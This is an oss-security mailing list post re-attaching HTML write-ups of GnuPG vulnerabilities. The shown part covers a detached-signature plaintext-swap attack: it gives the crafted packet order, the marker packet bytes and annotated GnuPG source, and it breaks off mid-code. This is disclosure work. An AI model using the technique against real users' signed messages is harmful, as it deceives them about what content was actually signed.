Received: (qmail 15637 invoked by uid 550); 28 Dec 2025 04:37:09 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
x-ms-reactions: disallow
Received: (qmail 12200 invoked from network); 28 Dec 2025 04:36:47 -0000
Date: Sun, 28 Dec 2025 05:36:44 +0100
From: Solar Designer <solar@openwall.com>
To: oss-security@lists.openwall.com
Cc: contact@gpg.fail
Message-ID: <20251228043644.GA915@openwall.com>
References: <3318308d-70b1-4ab3-9cca-ab4ea67dd27d@gmail.com> <20251228042744.GA629@openwall.com>
Mime-Version: 1.0
Content-Type: multipart/mixed; boundary="1yeeQ81UyVL57Vl7"
Content-Disposition: inline
In-Reply-To: <20251228042744.GA629@openwall.com>
User-Agent: Mutt/1.4.2.3i
Subject: Re: [oss-security] Many vulnerabilities in GnuPG

--1yeeQ81UyVL57Vl7
Content-Type: text/plain; charset=us-ascii
Content-Disposition: inline

On Sun, Dec 28, 2025 at 05:27:44AM +0100, Solar Designer wrote:
> >     1. Multiple Plaintext Attack on Detached PGP Signatures in GnuPG
> >     2. GnuPG Accepts Path Separators and Path Traversals in Literal Data
> >        "Filename" Field
> >     3. Cleartext Signature Plaintext Truncated for Hash Calculation
> >     4. Encrypted message malleability checks are incorrectly enforced causing
> >        plaintext recovery attacks
> >     5. Memory Corruption in ASCII-Armor Parsing
> >     6. Trusted comment injection (minisign)
> >     7. Cleartext Signature Forgery in the NotDashEscaped header
> >        implementation in GnuPG
> >     8. OpenPGP Cleartext Signature Framework Susceptible to Format Confusion
> >     9. GnuPG Output Fails To Distinguish Signature Verification Success From
> >        Message Content
> >    10. Cleartext Signature Forgery in GnuPG
> >    11. Radix64 Line-Truncation Enabling Polyglot Attacks
> >    12. GnuPG may downgrade digest algorithm to SHA1 during key signature
> >        checking
> >    13. GnuPG Trust Packet Parsing Enables Adding Arbitrary Subkeys
> >    14. Trusted comment Injection (minisign)
> 
> Each of the above 14 vulnerabilities has its own web page.  I attach 14
> text (converted with ELinks at width 80) and 14 HTML files corresponding
> to them.

Oh, the HTMLs got stripped by the MIME type filter.  Let me try again
with the filter temporarily disabled.  I am actually unsure we should
have them in here (not just the text versions), but since I announced...

Alexander

--1yeeQ81UyVL57Vl7
Content-Type: text/html; charset=utf-8
Content-Disposition: attachment; filename="01-detached.html"
Content-Transfer-Encoding: quoted-printable

<!doctype html>
<html lang=3D"en">
	<head>
		<meta charset=3D"utf-8" />
		<meta name=3D"darkreader-lock" />
		<meta name=3D"viewport" content=3D"width=3Ddevice-width, initial-scale=3D=
1" />
		<link rel=3D"manifest" href=3D"/manifest.webmanifest">
        <link rel=3D"icon" href=3D"/favicon.ico" sizes=3D"32x32">
        <link rel=3D"icon" href=3D"/icon.svg" type=3D"image/svg+xml">
        <link rel=3D"apple-touch-icon" href=3D"/apple-touch-icon.png">
=09=09
		<link href=3D"./_app/immutable/assets/0.B3PCwX-h.css" rel=3D"stylesheet">=
<!--12qhfyh--><!----><title>gpg.fail</title>
	</head>
	<body><!--[--><!--[--><!----><main class=3D"min-w-full max-w-[1280px] my-a=
uto bg-green-500 p-4 space-y-4"><!----><article class=3D"prose mx-auto"><h1=
>Multiple Plaintext Attack on Detached PGP Signatures in GnuPG</h1> <!---->=
<p>An attacker can arbitrarily swap the plaintext shown to a <em>GnuPG</em>=
 user, when the user verifies a detached signature versus views it with <co=
de>--decrypt</code>.</p> <h2>Impact</h2> <p>This attack allows deceiving us=
ers verifying messages, following <em>GnuPG</em> usage <a href=3D"https://w=
ww.gnupg.org/gph/en/manual/x135.html" rel=3D"nofollow">best practices</a> a=
bout the content of a message signed with a detached signature. Note, that =
it is possible in many scenarios to convert between signature types, i.e., =
convert a different signature type to a detached signature</p> <h2>Details<=
/h2> <p>We take a detached signature containing:</p> <ul><li>the original f=
ile</li> <li>a <code>.sig</code> file containing a Signature Packet</li></u=
l> <p>(Alternatively, we can use a full signature and extract the original =
file with <code>--decrypt</code>; this also gives us a pre-made One-Pass Pa=
cket for the next step.)</p> <p>We then overwrite the <code>.sig</code> fil=
e with the following packets:</p> <ol><li>One-Pass Packet for original sign=
ature</li> <li>Literal Packet containing injected, unsigned data</li> <li>U=
nmodified Signature Packet for original file</li> <li>Marker Packet (0x[<co=
de>ca ff 00 00 00 03 50 47 50</code>])</li></ol> <p>GnuPG=E2=80=99s main pr=
ocess keeps track of how many data packets it has seen in its context:</p> =
<!----><pre class=3D"shiki github-dark-default" style=3D"background-color:#=
0d1117;color:#e6edf3" tabindex=3D"0"><code><span class=3D"line"><span style=
=3D"color:#8B949E">/*</span></span>
<span class=3D"line"><span style=3D"color:#8B949E"> * Object to hold the pr=
ocessing context.</span></span>
<span class=3D"line"><span style=3D"color:#8B949E"> */</span></span>
<span class=3D"line"><span style=3D"color:#FF7B72">typedef</span><span styl=
e=3D"color:#FF7B72"> struct</span><span style=3D"color:#E6EDF3"> mainproc_c=
ontext</span><span style=3D"color:#FF7B72">*</span><span style=3D"color:#E6=
EDF3"> CTX;</span></span>
<span class=3D"line"></span>
<span class=3D"line"><span style=3D"color:#FF7B72">struct</span><span style=
=3D"color:#E6EDF3"> mainproc_context &#123;</span></span>
<span class=3D"line"><span style=3D"color:#8B949E">  // ...</span></span>
<span class=3D"line"><span style=3D"color:#FF7B72">  struct</span><span sty=
le=3D"color:#E6EDF3"> &#123;</span></span>
<span class=3D"line"><span style=3D"color:#FF7B72">    unsigned</span><span=
 style=3D"color:#FF7B72"> int</span><span style=3D"color:#E6EDF3"> sig_seen=
 : </span><span style=3D"color:#79C0FF">1</span><span style=3D"color:#E6EDF=
3">;</span><span style=3D"color:#8B949E"> /* Set to true if a signature pac=
ket</span></span>
<span class=3D"line"><span style=3D"color:#8B949E">                        =
             has been seen. */</span></span>
<span class=3D"line"><span style=3D"color:#FF7B72">    unsigned</span><span=
 style=3D"color:#FF7B72"> int</span><span style=3D"color:#E6EDF3"> data : <=
/span><span style=3D"color:#79C0FF">1</span><span style=3D"color:#E6EDF3">;=
</span><span style=3D"color:#8B949E"> /* Any data packet seen */</span></sp=
an>
<span class=3D"line"><span style=3D"color:#FF7B72">    unsigned</span><span=
 style=3D"color:#FF7B72"> int</span><span style=3D"color:#E6EDF3"> uncompre=
ss_failed : </span><span style=3D"color:#79C0FF">1</span><span style=3D"col=
or:#E6EDF3">;</span></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">  &#125; any;</span></sp=
an>
<span class=3D"line"><span style=3D"color:#E6EDF3">&#125;;</span></span></c=
ode></pre><!----> <p>While processing a packet list, the <code>data</code> =
field is written in the line annotated by us with <code>[1]</code> (origina=
l code formatting):</p> <!----><pre class=3D"shiki github-dark-default" sty=
le=3D"background-color:#0d1117;color:#e6edf3" tabindex=3D"0"><code><span cl=
ass=3D"line"><span style=3D"color:#FF7B72">static</span><span style=3D"colo=
r:#FF7B72"> int</span></span>
<span class=3D"line"><span style=3D"color:#D2A8FF">do_proc_packets</span><s=
pan style=3D"color:#E6EDF3"> (CTX </span><span style=3D"color:#FFA657">c</s=
pan><span style=3D"color:#E6EDF3">, </span><span style=3D"color:#79C0FF">io=
buf_t</span><span style=3D"color:#FFA657"> a</span><span style=3D"color:#E6=
EDF3">, </span><span style=3D"color:#FF7B72">int</span><span style=3D"color=
:#FFA657"> keep_dek_and_list</span><span style=3D"color:#E6EDF3">)</span></=
span>
<span class=3D"line"><span style=3D"color:#E6EDF3">&#123;</span></span>
<span class=3D"line"><span style=3D"color:#8B949E">  // ...</span></span>
<span class=3D"line"><span style=3D"color:#FF7B72">  while</span><span styl=
e=3D"color:#E6EDF3"> ((rc</span><span style=3D"color:#FF7B72">=3D</span><sp=
an style=3D"color:#D2A8FF">parse_packet</span><span style=3D"color:#E6EDF3"=
> (</span><span style=3D"color:#FF7B72">&#x26;</span><span style=3D"color:#=
E6EDF3">parsectx, pkt)) </span><span style=3D"color:#FF7B72">!=3D</span><sp=
an style=3D"color:#FF7B72"> -</span><span style=3D"color:#79C0FF">1</span><=
span style=3D"color:#E6EDF3">)</span></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">    &#123;</span></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">      newpkt </span><spa=
n style=3D"color:#FF7B72">=3D</span><span style=3D"color:#FF7B72"> -</span>=
<span style=3D"color:#79C0FF">1</span><span style=3D"color:#E6EDF3">;</span=
></span>
<span class=3D"line"><span style=3D"color:#FF7B72">      if</span><span sty=
le=3D"color:#E6EDF3"> (opt.list_packets)</span></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">        &#123;</span></s=
pan>
<span class=3D"line"><span style=3D"color:#FF7B72">          switch</span><=
span style=3D"color:#E6EDF3"> (pkt->pkttype)</span></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">            &#123;</span=
></span>
<span class=3D"line"><span style=3D"color:#FF7B72">            case</span><=
span style=3D"color:#E6EDF3"> PKT_PUBKEY_ENC:    </span><span style=3D"colo=
r:#D2A8FF">proc_pubkey_enc</span><span style=3D"color:#E6EDF3"> (c, pkt); <=
/span><span style=3D"color:#FF7B72">break</span><span style=3D"color:#E6EDF=
3">;</span></span>
<span class=3D"line"><span style=3D"color:#FF7B72">            case</span><=
span style=3D"color:#E6EDF3"> PKT_SYMKEY_ENC:    </span><span style=3D"colo=
r:#D2A8FF">proc_symkey_enc</span><span style=3D"color:#E6EDF3"> (c, pkt); <=
/span><span style=3D"color:#FF7B72">break</span><span style=3D"color:#E6EDF=
3">;</span></span>
<span class=3D"line"><span style=3D"color:#FF7B72">            case</span><=
span style=3D"color:#E6EDF3"> PKT_ENCRYPTED:</span></span>
<span class=3D"line"><span style=3D"color:#FF7B72">            case</span><=
span style=3D"color:#E6EDF3"> PKT_ENCRYPTED_MDC:</span></span>
<span class=3D"line"><span style=3D"color:#FF7B72">            case</span><=
span style=3D"color:#E6EDF3"> PKT_ENCRYPTED_AEAD:</span><span style=3D"colo=
r:#D2A8FF">proc_encrypted</span><span style=3D"color:#E6EDF3"> (c, pkt); </=
span><span style=3D"color:#FF7B72">break</span><span style=3D"color:#E6EDF3=
">;</span></span>
<span class=3D"line"><span style=3D"color:#FF7B72">            case</span><=
span style=3D"color:#E6EDF3"> PKT_COMPRESSED:    rc </span><span style=3D"c=
olor:#FF7B72">=3D</span><span style=3D"color:#D2A8FF"> proc_compressed</spa=
n><span style=3D"color:#E6EDF3"> (c, pkt); </span><span style=3D"color:#FF7=
B72">break</span><span style=3D"color:#E6EDF3">;</span></span>
<span class=3D"line"><span style=3D"color:#FF7B72">            default</spa=
n><span style=3D"color:#E6EDF3">: newpkt </span><span style=3D"color:#FF7B7=
2">=3D</span><span style=3D"color:#79C0FF"> 0</span><span style=3D"color:#E=
6EDF3">; </span><span style=3D"color:#FF7B72">break</span><span style=3D"co=
lor:#E6EDF3">;</span></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">	    &#125;</span></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">	&#125;</span></span>
<span class=3D"line"><span style=3D"color:#FF7B72">      else</span><span s=
tyle=3D"color:#FF7B72"> if</span><span style=3D"color:#E6EDF3"> (c->sigs_on=
ly)</span></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">        &#123;</span></s=
pan>
<span class=3D"line"><span style=3D"color:#FF7B72">          switch</span><=
span style=3D"color:#E6EDF3"> (pkt->pkttype)</span></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">            &#123;</span=
></span>
<span class=3D"line"><span style=3D"color:#FF7B72">            case</span><=
span style=3D"color:#E6EDF3"> PKT_PUBLIC_KEY:</span></span>
<span class=3D"line"><span style=3D"color:#FF7B72">            case</span><=
span style=3D"color:#E6EDF3"> PKT_SECRET_KEY:</span></span>
<span class=3D"line"><span style=3D"color:#FF7B72">            case</span><=
span style=3D"color:#E6EDF3"> PKT_USER_ID:</span></span>
<span class=3D"line"><span style=3D"color:#FF7B72">            case</span><=
span style=3D"color:#E6EDF3"> PKT_SYMKEY_ENC:</span></span>
<span class=3D"line"><span style=3D"color:#FF7B72">            case</span><=
span style=3D"color:#E6EDF3"> PKT_PUBKEY_ENC:</span></span>
<span class=3D"line"><span style=3D"color:#FF7B72">            case</span><=
span style=3D"color:#E6EDF3"> PKT_ENCRYPTED:</span></span>
<span class=3D"line"><span style=3D"color:#FF7B72">            case</span><=
span style=3D"color:#E6EDF3"> PKT_ENCRYPTED_MDC:</span></span>
<span class=3D"line"><span style=3D"color:#FF7B72">            case</span><=
span style=3D"color:#E6EDF3"> PKT_ENCRYPTED_AEAD:</span></span>
<span class=3D"line"><span style=3D"color:#D2A8FF">              write_stat=
us_text</span><span style=3D"color:#E6EDF3">( STATUS_UNEXPECTED, </span><sp=
an style=3D"color:#A5D6FF">"0"</span><span style=3D"color:#E6EDF3"> );</spa=
n></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">              rc </span>=
<span style=3D"color:#FF7B72">=3D</span><span style=3D"color:#E6EDF3"> GPG_=
ERR_UNEXPECTED;</span></span>
<span class=3D"line"><span style=3D"color:#FF7B72">              goto</span=
><span style=3D"color:#E6EDF3"> leave;</span></span>
<span class=3D"line"></span>
<span class=3D"line"><span style=3D"color:#FF7B72">            case</span><=
span style=3D"color:#E6EDF3"> PKT_SIGNATURE:   newpkt </span><span style=3D=
"color:#FF7B72">=3D</span><span style=3D"color:#D2A8FF"> add_signature</spa=
n><span style=3D"color:#E6EDF3"> (c, pkt); </span><span style=3D"color:#FF7=
B72">break</span><span style=3D"color:#E6EDF3">;</span></span>
<span class=3D"line"><span style=3D"color:#FF7B72">            case</span><=
span style=3D"color:#E6EDF3"> PKT_PLAINTEXT:   </span><span style=3D"color:=
#D2A8FF">proc_plaintext</span><span style=3D"color:#E6EDF3"> (c, pkt); </sp=
an><span style=3D"color:#FF7B72">break</span><span style=3D"color:#E6EDF3">=
;</span></span>
<span class=3D"line"><span style=3D"color:#FF7B72">            case</span><=
span style=3D"color:#E6EDF3"> PKT_COMPRESSED:  rc </span><span style=3D"col=
or:#FF7B72">=3D</span><span style=3D"color:#D2A8FF"> proc_compressed</span>=
<span style=3D"color:#E6EDF3"> (c, pkt); </span><span style=3D"color:#FF7B7=
2">break</span><span style=3D"color:#E6EDF3">;</span></span>
<span class=3D"line"><span style=3D"color:#FF7B72">            case</span><=
span style=3D"color:#E6EDF3"> PKT_ONEPASS_SIG: newpkt </span><span style=3D=
"color:#FF7B72">=3D</span><span style=3D"color:#D2A8FF"> add_onepass_sig</s=
pan><span style=3D"color:#E6EDF3"> (c, pkt); </span><span style=3D"color:#F=
F7B72">break</span><span style=3D"color:#E6EDF3">;</span></span>
<span class=3D"line"><span style=3D"color:#FF7B72">            case</span><=
span style=3D"color:#E6EDF3"> PKT_GPG_CONTROL: newpkt </span><span style=3D=
"color:#FF7B72">=3D</span><span style=3D"color:#D2A8FF"> add_gpg_control</s=
pan><span style=3D"color:#E6EDF3"> (c, pkt); </span><span style=3D"color:#F=
F7B72">break</span><span style=3D"color:#E6EDF3">;</span></span>
<span class=3D"line"><span style=3D"color:#FF7B72">            default</spa=
n><span style=3D"color:#E6EDF3">: newpkt </span><span style=3D"color:#FF7B7=
2">=3D</span><span style=3D"color:#79C0FF"> 0</span><span style=3D"color:#E=
6EDF3">; </span><span style=3D"color:#FF7B72">break</span><span style=3D"co=
lor:#E6EDF3">;</span></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">	    &#125;</span></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">	&#125;</span></span>
<span class=3D"line"><span style=3D"color:#FF7B72">      else</span><span s=
tyle=3D"color:#FF7B72"> if</span><span style=3D"color:#E6EDF3"> (c->encrypt=
_only)</span></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">        &#123;</span></s=
pan>
<span class=3D"line"><span style=3D"color:#FF7B72">          switch</span><=
span style=3D"color:#E6EDF3"> (pkt->pkttype)</span></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">            &#123;</span=
></span>
<span class=3D"line"><span style=3D"color:#FF7B72">            case</span><=
span style=3D"color:#E6EDF3"> PKT_PUBLIC_KEY:</span></span>
<span class=3D"line"><span style=3D"color:#FF7B72">            case</span><=
span style=3D"color:#E6EDF3"> PKT_SECRET_KEY:</span></span>
<span class=3D"line"><span style=3D"color:#FF7B72">            case</span><=
span style=3D"color:#E6EDF3"> PKT_USER_ID:</span></span>
<span class=3D"line"><span style=3D"color:#D2A8FF">              write_stat=
us_text</span><span style=3D"color:#E6EDF3"> (STATUS_UNEXPECTED, </span><sp=
an style=3D"color:#A5D6FF">"0"</span><span style=3D"color:#E6EDF3">);</span=
></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">              rc </span>=
<span style=3D"color:#FF7B72">=3D</span><span style=3D"color:#E6EDF3"> GPG_=
ERR_UNEXPECTED;</span></span>
<span class=3D"line"><span style=3D"color:#FF7B72">              goto</span=
><span style=3D"color:#E6EDF3"> leave;</span></span>
<span class=3D"line"></span>
<span class=3D"line"><span style=3D"color:#FF7B72">            case</span><=
span style=3D"color:#E6EDF3"> PKT_SIGNATURE:   newpkt </span><span style=3D=
"color:#FF7B72">=3D</span><span style=3D"color:#D2A8FF"> add_signature</spa=
n><span style=3D"color:#E6EDF3"> (c, pkt); </span><span style=3D"color:#FF7=
B72">break</span><span style=3D"color:#E6EDF3">;</span></span>
<span class=3D"line"></span>
<span class=3D"line"><span style=3D"color:#FF7B72">            case</span><=
span style=3D"color:#E6EDF3"> PKT_SYMKEY_ENC:</span></span>
<span class=3D"line"><span style=3D"color:#FF7B72">            case</span><=
span style=3D"color:#E6EDF3"> PKT_PUBKEY_ENC:</span></span>
<span class=3D"line"><span style=3D"color:#8B949E">              /* In --ad=
d-recipients mode set the stop flag as soon as</span></span>
<span class=3D"line"><span style=3D"color:#8B949E">               * we see =
the first of these packets.  */</span></span>
<span class=3D"line"><span style=3D"color:#FF7B72">              if</span><=
span style=3D"color:#E6EDF3"> (c</span><span style=3D"color:#FF7B72">-></sp=
an><span style=3D"color:#E6EDF3">ctrl</span><span style=3D"color:#FF7B72">-=
></span><span style=3D"color:#E6EDF3">modify_recipients)</span></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">                parsectx=
.only_fookey_enc </span><span style=3D"color:#FF7B72">=3D</span><span style=
=3D"color:#79C0FF"> 1</span><span style=3D"color:#E6EDF3">;</span></span>
<span class=3D"line"><span style=3D"color:#FF7B72">              if</span><=
span style=3D"color:#E6EDF3"> (pkt</span><span style=3D"color:#FF7B72">-></=
span><span style=3D"color:#E6EDF3">pkttype </span><span style=3D"color:#FF7=
B72">=3D=3D</span><span style=3D"color:#E6EDF3"> PKT_SYMKEY_ENC)</span></sp=
an>
<span class=3D"line"><span style=3D"color:#D2A8FF">                proc_sym=
key_enc</span><span style=3D"color:#E6EDF3"> (c, pkt);</span></span>
<span class=3D"line"><span style=3D"color:#FF7B72">              else</span=
></span>
<span class=3D"line"><span style=3D"color:#D2A8FF">                proc_pub=
key_enc</span><span style=3D"color:#E6EDF3"> (c, pkt);</span></span>
<span class=3D"line"><span style=3D"color:#FF7B72">              break</spa=
n><span style=3D"color:#E6EDF3">;</span></span>
<span class=3D"line"></span>
<span class=3D"line"><span style=3D"color:#FF7B72">            case</span><=
span style=3D"color:#E6EDF3"> PKT_ENCRYPTED:</span></span>
<span class=3D"line"><span style=3D"color:#FF7B72">            case</span><=
span style=3D"color:#E6EDF3"> PKT_ENCRYPTED_MDC:</span></span>
<span class=3D"line"><span style=3D"color:#FF7B72">            case</span><=
span style=3D"color:#E6EDF3"> PKT_ENCRYPTED_AEAD: </span><span style=3D"col=
or:#D2A8FF">proc_encrypted</span><span style=3D"color:#E6EDF3"> (c, pkt); <=
/span><span style=3D"color:#FF7B72">break</span><span style=3D"color:#E6EDF=
3">;</span></span>
<span class=3D"line"><span style=3D"color:#FF7B72">            case</span><=
span style=3D"color:#E6EDF3"> PKT_PLAINTEXT:   </span><span style=3D"color:=
#D2A8FF">proc_plaintext</span><span style=3D"color:#E6EDF3"> (c, pkt); </sp=
an><span style=3D"color:#FF7B72">break</span><span style=3D"color:#E6EDF3">=
;</span></span>
<span class=3D"line"><span style=3D"color:#FF7B72">            case</span><=
span style=3D"color:#E6EDF3"> PKT_COMPRESSED:  rc </span><span style=3D"col=
or:#FF7B72">=3D</span><span style=3D"color:#D2A8FF"> proc_compressed</span>=
<span style=3D"color:#E6EDF3"> (c, pkt); </span><span style=3D"color:#FF7B7=
2">break</span><span style=3D"color:#E6EDF3">;</span></span>
<span class=3D"line"><span style=3D"color:#FF7B72">            case</span><=
span style=3D"color:#E6EDF3"> PKT_ONEPASS_SIG: newpkt </span><span style=3D=
"color:#FF7B72">=3D</span><span style=3D"color:#D2A8FF"> add_onepass_sig</s=
pan><span style=3D"color:#E6EDF3"> (c, pkt); </span><span style=3D"color:#F=
F7B72">break</span><span style=3D"color:#E6EDF3">;</span></span>
<span class=3D"line"><span style=3D"color:#FF7B72">            case</span><=
span style=3D"color:#E6EDF3"> PKT_GPG_CONTROL: newpkt </span><span style=3D=
"color:#FF7B72">=3D</span><span style=3D"color:#D2A8FF"> add_gpg_control</s=
pan><span style=3D"color:#E6EDF3"> (c, pkt); </span><span style=3D"color:#F=
F7B72">break</span><span style=3D"color:#E6EDF3">;</span></span>
<span class=3D"line"><span style=3D"color:#FF7B72">            default</spa=
n><span style=3D"color:#E6EDF3">: newpkt </span><span style=3D"color:#FF7B7=
2">=3D</span><span style=3D"color:#79C0FF"> 0</span><span style=3D"color:#E=
6EDF3">; </span><span style=3D"color:#FF7B72">break</span><span style=3D"co=
lor:#E6EDF3">;</span></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">	    &#125;</span></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">	&#125;</span></span>
<span class=3D"line"><span style=3D"color:#8B949E">      // ...</span></spa=
n>
<span class=3D"line"><span style=3D"color:#FF7B72">      if</span><span sty=
le=3D"color:#E6EDF3"> (pkt->pkttype </span><span style=3D"color:#FF7B72">!=
=3D</span><span style=3D"color:#E6EDF3"> PKT_SIGNATURE </span><span style=
=3D"color:#FF7B72">&#x26;&#x26;</span><span style=3D"color:#E6EDF3"> pkt->p=
kttype </span><span style=3D"color:#FF7B72">!=3D</span><span style=3D"color=
:#E6EDF3"> PKT_MDC)</span></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">        c->any.data </sp=
an><span style=3D"color:#FF7B72">=3D</span><span style=3D"color:#E6EDF3"> (=
pkt->pkttype </span><span style=3D"color:#FF7B72">=3D=3D</span><span style=
=3D"color:#E6EDF3"> PKT_PLAINTEXT);</span><span style=3D"color:#8B949E"> //=
 [1]</span></span>
<span class=3D"line"><span style=3D"color:#8B949E">    // ...</span></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">	&#125;</span></span>
<span class=3D"line"><span style=3D"color:#FF7B72">      else</span></span>
<span class=3D"line"><span style=3D"color:#D2A8FF">        free_packet</spa=
n><span style=3D"color:#E6EDF3"> (pkt, </span><span style=3D"color:#FF7B72"=
>&#x26;</span><span style=3D"color:#E6EDF3">parsectx);</span></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">    &#125;</span></span>
<span class=3D"line"></span>
<span class=3D"line"><span style=3D"color:#8B949E"> // ...</span></span>
<span class=3D"line"></span>
<span class=3D"line"><span style=3D"color:#E6EDF3"> leave:</span></span>
<span class=3D"line"><span style=3D"color:#FF7B72">  if</span><span style=
=3D"color:#E6EDF3"> (</span><span style=3D"color:#FF7B72">!</span><span sty=
le=3D"color:#E6EDF3">keep_dek_and_list)</span></span>
<span class=3D"line"><span style=3D"color:#D2A8FF">    release_list</span><=
span style=3D"color:#E6EDF3"> (c);</span></span>
<span class=3D"line"><span style=3D"color:#FF7B72">  return</span><span sty=
le=3D"color:#E6EDF3"> rc;</span></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">&#125;</span></span></co=
de></pre><!----> <p>In summary:</p> <ul><li>It only allows certain packet t=
ypes in <code>encrypt_only</code> and <code>sigs_only</code></li> <li>After=
 each packet, it checks if the packet is not a Signature or MDC Packet <ul>=
<li>If so, it sets <code>any.data</code> to whether the latest packet is a =
Literal Data Packet (<code>PKT_PLAINTEXT</code>)</li></ul></li></ul> <p>The=
 intended behavior for the packet types is this: (<code>any.data</code> sta=
rts at <code>0</code>)</p> <ul><li>Detached signatures: <ul><li>Signature P=
acket: Sig/MDC, skip write. <code>any.data =3D=3D 0</code></li></ul></li> <=
li>Full signatures: <ul><li>One-Pass Signature Packet: Not Sig/MDC, write <=
code>pkttype =3D=3D PKT_PLAINTEXT</code>. <code>any.data =3D 0</code></li> =
<li>Literal Data Packet: Not Sig/MDC, write <code>pkttype =3D=3D PKT_PLAINT=
EXT</code>. <code>any.data =3D 1</code></li> <li>Signature Packet: Sig/MDC,=
 skip write. <code>any.data =3D=3D 1</code></li></ul></li> <li>Cleartext si=
gnature (using internal GPG packet): <ul><li>GPG Control Packet: Not Sig/MD=
C, write <code>pkttype =3D=3D PKT_PLAINTEXT</code>. <code>any.data =3D 0</c=
ode></li> <li>Literal Data Packet: Not Sig/MDC, write <code>pkttype =3D=3D =
PKT_PLAINTEXT</code>. <code>any.data =3D 1</code></li> <li>Signature Packet=
: Sig/MDC, skip write. <code>any.data =3D=3D 1</code></li></ul></li></ul> <=
p>However, an attacker can set <code>any.data</code> to <code>0</code> by f=
orming an invalid message similar to a full signature:</p> <ul><li>One-Pass=
 Signature Packet: Not Sig/MDC, write <code>pkttype =3D=3D PKT_PLAINTEXT</c=
ode>. <code>any.data =3D 0</code></li> <li>Literal Data Packet: Not Sig/MDC=
, write <code>pkttype =3D=3D PKT_PLAINTEXT</code>. <code>any.data =3D 1</co=
de></li> <li>Signature Packet: Sig/MDC, skip write. <code>any.data =3D=3D 1=
</code></li> <li>Marker Packet: Not Sig/MDC, write <code>pkttype =3D=3D PKT=
_PLAINTEXT</code>. <code>any.data =3D 0</code></li></ul> <p>This sets <code=
>any.data</code> to <code>0</code> <em>despite there being a data packet</e=
m>. And since the <code>PKT_MARKER</code> type is not covered by the non-ex=
haustive <code>switch</code> cases, the packet can simply be inserted into =
the message.</p> <p>When GnuPG parses the message above, it creates a hash =
buffer for the literal packet above and handles output when processing the =
packet. This happens in the switch case above in the <code>case PKT_PLAINTE=
XT: proc_plaintext(c, pkt);</code> branch, which does the following:</p> <!=
----><pre class=3D"shiki github-dark-default" style=3D"background-color:#0d=
1117;color:#e6edf3" tabindex=3D"0"><code><span class=3D"line"><span style=
=3D"color:#FF7B72">static</span><span style=3D"color:#FF7B72"> void</span><=
span style=3D"color:#D2A8FF"> proc_plaintext</span><span style=3D"color:#E6=
EDF3">(CTX </span><span style=3D"color:#FFA657">c</span><span style=3D"colo=
r:#E6EDF3">, PACKET</span><span style=3D"color:#FF7B72">*</span><span style=
=3D"color:#FFA657"> pkt</span><span style=3D"color:#E6EDF3">) &#123;</span>=
</span>
<span class=3D"line"><span style=3D"color:#8B949E">  // ...</span></span>
<span class=3D"line"><span style=3D"color:#D2A8FF">  free_md_filter_context=
</span><span style=3D"color:#E6EDF3">(</span><span style=3D"color:#FF7B72">=
&#x26;</span><span style=3D"color:#E6EDF3">c->mfx);</span></span>
<span class=3D"line"><span style=3D"color:#FF7B72">  if</span><span style=
=3D"color:#E6EDF3"> (</span><span style=3D"color:#D2A8FF">gcry_md_open</spa=
n><span style=3D"color:#E6EDF3">(</span><span style=3D"color:#FF7B72">&#x26=
;</span><span style=3D"color:#E6EDF3">c->mfx.md, </span><span style=3D"colo=
r:#79C0FF">0</span><span style=3D"color:#E6EDF3">, </span><span style=3D"co=
lor:#79C0FF">0</span><span style=3D"color:#E6EDF3">))</span></span>
<span class=3D"line"><span style=3D"color:#D2A8FF">    BUG</span><span styl=
e=3D"color:#E6EDF3">();</span></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">  </span></span>
<span class=3D"line"><span style=3D"color:#8B949E">  // ...</span></span>
<span class=3D"line"></span>
<span class=3D"line"><span style=3D"color:#FF7B72">  if</span><span style=
=3D"color:#E6EDF3"> (</span><span style=3D"color:#FF7B72">!</span><span sty=
le=3D"color:#E6EDF3">rc) &#123;</span></span>
<span class=3D"line"><span style=3D"color:#8B949E">    /* It we are in --ve=
rify mode, we do not want to output the</span></span>
<span class=3D"line"><span style=3D"color:#8B949E">     * signed text.  How=
ever, if --output is also used we do what</span></span>
<span class=3D"line"><span style=3D"color:#8B949E">     * has been requeste=
d and write out the signed data.  */</span></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">    rc </span><span styl=
e=3D"color:#FF7B72">=3D</span><span style=3D"color:#D2A8FF"> handle_plainte=
xt</span><span style=3D"color:#E6EDF3">(pt, </span><span style=3D"color:#FF=
7B72">&#x26;</span><span style=3D"color:#E6EDF3">c->mfx,</span></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">                        =
  (opt.outfp </span><span style=3D"color:#FF7B72">||</span><span style=3D"c=
olor:#E6EDF3"> opt.outfile) </span><span style=3D"color:#FF7B72">?</span><s=
pan style=3D"color:#79C0FF"> 0</span><span style=3D"color:#FF7B72"> :</span=
><span style=3D"color:#E6EDF3"> c->sigs_only,</span></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">                        =
  clearsig);</span></span>
<span class=3D"line"><span style=3D"color:#FF7B72">    if</span><span style=
